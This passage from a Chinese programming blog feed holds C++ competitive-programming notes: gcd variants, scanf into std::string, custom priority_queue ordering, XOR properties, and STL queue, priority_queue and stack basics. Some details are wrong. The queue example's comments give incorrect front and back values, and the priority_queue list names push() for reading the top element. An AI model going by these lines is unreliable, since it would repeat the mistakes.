class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>2.位运算<br>a，b不可以为 0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(b^=a^=b^=a%=b);<br>    <span class="hljs-keyword">return</span> a;   <span class="hljs-comment">//最大公约数</span><br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>3.三目运算<br>a，b可以为 0。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> b&gt;<span class="hljs-number">0</span> ? gcd(b,a%b):a;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>4.C++自带函数</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">__gcd(a,b);<br></code></pre></div></td></tr></table></figure><h3 id="7-用scanf输入string"><a href="#7-用scanf输入string" class="headerlink" title="7.用scanf输入string"></a>7.用scanf输入string</h3><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">string</span> a;<br>a.resize(<span class="hljs-number">100</span>); <span class="hljs-comment">//需要预先分配空间</span><br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;a[<span class="hljs-number">0</span>]); <span class="hljs-comment">//不能写成&amp;a,必须要写&amp;a[0]</span><br><span class="hljs-comment">//printf(&quot;%s&quot;,a.c_str());</span><br><span class="hljs-comment">//puts(a.c_str());</span><br><span class="hljs-built_in">cout</span>&lt;&lt;a.c_str()&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>c_str()函数返回一个指向正规C字符串的指针常量, 内容与本string串相同。为了与c语言兼容，在c语言中没有string类型，故必须通过string类对象的成员函数c_str()把string 对象转换成c中的字符串样式。</p><h4 id="7-1从指定的下标开始输入"><a href="#7-1从指定的下标开始输入" class="headerlink" title="7.1从指定的下标开始输入"></a>7.1从指定的下标开始输入</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//这里以从下标1开始存入</span><br><span class="hljs-built_in">string</span> s;<br>s.resize(<span class="hljs-number">100</span>);<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,&amp;s[<span class="hljs-number">1</span>]); <span class="hljs-comment">//指定从下标1开始存</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">10</span>;++i) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,s[i]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,s[<span class="hljs-number">1</span>]);<br></code></pre></div></td></tr></table></figure><h3 id="8-优先队列（priority-queue）的自定义排序"><a href="#8-优先队列（priority-queue）的自定义排序" class="headerlink" title="8.优先队列（priority_queue）的自定义排序"></a>8.优先队列（priority_queue）的自定义排序</h3><h4 id="实现一"><a href="#实现一" class="headerlink" title="实现一"></a>实现一</h4><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sq</span>&#123;</span><br><span class="hljs-keyword">int</span> num ,id;<br>&#125;;<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>&lt;(<span class="hljs-keyword">const</span> sq &amp;x, <span class="hljs-keyword">const</span> sq &amp;y)&#123;<span class="hljs-comment">//重载小于号，适用于优先队列的排序规则</span><br><span class="hljs-keyword">if</span>(x.num==y.num)<br><span class="hljs-keyword">return</span> x.id&gt;y.id; <span class="hljs-comment">//小的数在前面，与其他的容器用法区别开。就同在优先队列中的greater和less用法和在其他容器中greater和less用法相反一样。下同</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> x.num&gt;y.num; <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">priority_queue</span>&lt;sq&gt; s;<br>sq a;<br>a.id=<span class="hljs-number">10</span>;<br>a.num=<span class="hljs-number">30</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">20</span>;<br>a.num=<span class="hljs-number">40</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">30</span>;<br>a.num=<span class="hljs-number">50</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">3</span>;<br>a.num=<span class="hljs-number">50</span>;<br>s.push(a);<br><span class="hljs-keyword">int</span> len=s.size();<br><span class="hljs-built_in">cout</span>&lt;&lt;len&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;len;++i)&#123;<br>sq t=s.top();<br><span class="hljs-built_in">cout</span>&lt;&lt;t.num&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;t.id&lt;&lt;<span class="hljs-built_in">endl</span>;<br>s.pop();<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">4</span><br><span class="hljs-number">30</span> <span class="hljs-number">10</span><br><span class="hljs-number">40</span> <span class="hljs-number">20</span><br><span class="hljs-number">50</span> <span class="hljs-number">3</span><br><span class="hljs-number">50</span> <span class="hljs-number">30</span><br></code></pre></div></td></tr></table></figure><p>其中，自定义排序规则的方法还有一种：</p><h4 id="实现二"><a href="#实现二" class="headerlink" title="实现二"></a>实现二</h4><p>代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e6</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sq</span>&#123;</span><br><span class="hljs-keyword">int</span> num ,id;<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">friend</span> <span class="hljs-keyword">operator</span>&lt;(sq x,sq y)&#123; <span class="hljs-comment">//解释同上面的</span><br><span class="hljs-keyword">if</span>(x.num==y.num)<br><span class="hljs-keyword">return</span> x.id&gt;y.id;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> x.num&gt;y.num;<br>&#125;<br><br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">priority_queue</span>&lt;sq&gt; s;<br>sq a;<br>a.id=<span class="hljs-number">10</span>;<br>a.num=<span class="hljs-number">30</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">20</span>;<br>a.num=<span class="hljs-number">40</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">30</span>;<br>a.num=<span class="hljs-number">50</span>;<br>s.push(a);<br>a.id=<span class="hljs-number">3</span>;<br>a.num=<span class="hljs-number">50</span>;<br>s.push(a);<br><span class="hljs-keyword">int</span> len=s.size();<br><span class="hljs-built_in">cout</span>&lt;&lt;len&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;len;++i)&#123;<br>sq t=s.top();<br><span class="hljs-built_in">cout</span>&lt;&lt;t.num&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;t.id&lt;&lt;<span class="hljs-built_in">endl</span>;<br>s.pop();<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">4</span><br><span class="hljs-number">30</span> <span class="hljs-number">10</span><br><span class="hljs-number">40</span> <span class="hljs-number">20</span><br><span class="hljs-number">50</span> <span class="hljs-number">3</span><br><span class="hljs-number">50</span> <span class="hljs-number">30</span><br></code></pre></div></td></tr></table></figure><p>输出的结果都是一样的。</p><h3 id="9-异或的作用"><a href="#9-异或的作用" class="headerlink" title="9.异或的作用"></a>9.异或的作用</h3><blockquote><p><strong>1.对于任何数x，都有x^x=0，x^0=x，同自己求异或为0，同0求异或为自己。</strong><br><strong>2.结合律（即(a^b)^c == a^(b^c)）。</strong><br><strong>3.自反性 A ^ B ^ B = A ^ 0 = A ，连续和同一个因子做异或运算，最终结果为自己。</strong></p></blockquote><h4 id="9-1找出那个唯一落单的数-其他出现两次，唯独它出现一次"><a href="#9-1找出那个唯一落单的数-其他出现两次，唯独它出现一次" class="headerlink" title="9.1找出那个唯一落单的数(其他出现两次，唯独它出现一次)"></a>9.1找出那个唯一落单的数(其他出现两次，唯独它出现一次)</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;<br>ans^=a[i]; <span class="hljs-comment">//a为存储所有数的数组。</span><br></code></pre></div></td></tr></table></figure><p>持续更新中······</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LCY算法培训-进阶班-第1讲（STL在竞赛中的应用）</title>
    <link href="/2021/03/31/LCY%E7%AE%97%E6%B3%95%E5%9F%B9%E8%AE%AD-%E8%BF%9B%E9%98%B6%E7%8F%AD-%E7%AC%AC1%E8%AE%B2%EF%BC%88STL%E5%9C%A8%E7%AB%9E%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%89/"/>
    <url>/2021/03/31/LCY%E7%AE%97%E6%B3%95%E5%9F%B9%E8%AE%AD-%E8%BF%9B%E9%98%B6%E7%8F%AD-%E7%AC%AC1%E8%AE%B2%EF%BC%88STL%E5%9C%A8%E7%AB%9E%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>2021杭电ACM-LCY算法培训进阶班知识总结。STL在竞赛中的应用PPT内容整理。</p><hr><h2 id="知识目录"><a href="#知识目录" class="headerlink" title="知识目录"></a>知识目录</h2><hr><h3 id="相关头文件"><a href="#相关头文件" class="headerlink" title="相关头文件"></a>相关头文件</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;//万能头文件</span></span><br></code></pre></div></td></tr></table></figure><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><hr><h3 id="1-队列-queue"><a href="#1-队列-queue" class="headerlink" title="1.队列(queue)"></a>1.队列(queue)</h3><h6 id="1）特点"><a href="#1）特点" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.先进先出(FIFO)<br>2.从队头删除元素<br>3.在队尾加入元素<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作"><a href="#2）常见操作" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">创建队列对象<br>queue&lt;元素类型&gt; 队列名;<br>queue&lt;int&gt; qq;<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.判断队列是否为空<br>队列名.empty();<br>qq.empty();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">2.查询队列大小<br>队列名.size();<br>qq.size();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">3.访问队首元素<br>队列名.front();<br>qq.front();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">4.访问队尾元素<br>队列名.back();<br>qq.back();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">5.加入元素(在队尾加入)<br>队列名.push(元素名);<br>qq.push();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">6.删除元素(在队首删除)<br>队列名.pop();<br>qq.pop();<br></code></pre></div></td></tr></table></figure><h6 id="3）实例"><a href="#3）实例" class="headerlink" title="3）实例"></a>3）实例</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> a,b,c,d;<br><span class="hljs-built_in">queue</span>&lt;<span class="hljs-keyword">int</span>&gt; qq;<br>qq.push(<span class="hljs-number">1</span>);<br>qq.push(<span class="hljs-number">3</span>);<br>qq.push(<span class="hljs-number">4</span>);<br>qq.pop();<br>a=qq.front();<span class="hljs-comment">//a=1</span><br>b=qq.back();<span class="hljs-comment">//b=3</span><br>c=qq.size();<span class="hljs-comment">//c=2</span><br>d=qq.empty();<span class="hljs-comment">//d=0</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="2-优先队列-priority-queue"><a href="#2-优先队列-priority-queue" class="headerlink" title="2.优先队列(priority_queue)"></a>2.优先队列(priority_queue)</h3><h6 id="1）特点-1"><a href="#1）特点-1" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.在队尾加入元素<br>2.从队头删除元素<br>3.每次取出的是具有最高优先权的元素(不一定先进先出)<br>4.内部的本质是用堆实现的<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作-1"><a href="#2）常见操作-1" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">创建队列对象<br>priority_queue&lt;元素类型&gt; 队列名;<br>priority_queue&lt;int&gt; qq;<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.判断队列是否为空<br>队列名.empty();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">2.查询队列大小<br>队列名.size();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">3.返回优先权最高的元素<br>队列名.push();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">4.加入元素<br>队列名.push();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">5.删除元素(删除第一个元素)<br>队列名.pop();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">6.访问最优元素<br>队列名.top();<br></code></pre></div></td></tr></table></figure><h6 id="3）实例-1"><a href="#3）实例-1" class="headerlink" title="3）实例"></a>3）实例</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-keyword">int</span>&gt; q;<br>    <span class="hljs-keyword">int</span> t,a=<span class="hljs-number">2</span>,b=<span class="hljs-number">5</span>,c=<span class="hljs-number">3</span>;<br>    q.push(a); q.push(b); q.push(c);<br>    <span class="hljs-keyword">while</span>(!q.empty())&#123;<br>        t=q.top();<br>        q.pop();<br>        <span class="hljs-built_in">cout</span>&lt;&lt;t&lt;&lt;<span class="hljs-built_in">endl</span>;<span class="hljs-comment">//printf(&quot;%d\n&quot;,t);</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//结果</span><br><span class="hljs-number">5</span><br><span class="hljs-number">3</span><br><span class="hljs-number">2</span>    <br></code></pre></div></td></tr></table></figure><hr><h3 id="3-栈-stack"><a href="#3-栈-stack" class="headerlink" title="3.栈(stack)"></a>3.栈(stack)</h3><h6 id="1）特点-2"><a href="#1）特点-2" class="headerlink" title="1）特点"></a>1）特点</h6><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.先进后出(FILO)<br>2.从栈顶删除元素<br>3.从栈顶加入元素<br></code></pre></div></td></tr></table></figure><h6 id="2）常见操作-2"><a href="#2）常见操作-2" class="headerlink" title="2）常见操作"></a>2）常见操作</h6><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs b">创建栈对象<br>stack&lt;元素类型&gt; 栈名;<br>stack&lt;int&gt; st;<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">1.判断栈是否为空<br>栈名.empty();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">2.查询栈大小<br>栈名.size();<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">3.</span>访问栈顶元素 <span class="hljs-comment">//要先确保栈非空</span><br>栈名.top();<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">4.栈顶加入元素<br>栈名.push(元素名);<br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">5.删除栈顶元素<br>栈名.pop();<br></code></pre></div></td></tr></table></figure><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">栈和队列一样，没有clear之类的函数，如果想要清空一个栈，需要循环调用出栈函数<br></code></pre></div></td></tr></table></figure><h6 id="3）实例-2"><a href="#3）实例-2" class="headerlink" title="3）实例"></a>3）实例</h6><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">stack</span>&lt;<span class="hljs-keyword">int</span>&gt; s;<br>s.push(<span class="hljs-number">1</span>);<br>s.push(<span class="hljs-number">2</span>);<br>s.push(<span class="hljs-number">3</span>);<br>s.pop();<br><span class="hljs-built_in">cout</span>&lt;&lt;s.top()&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//2</span><br>s.top()+=<span class="hljs-number">3</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;s.top()&lt;&lt;<span class="hljs-built_in">endl</span>; <span 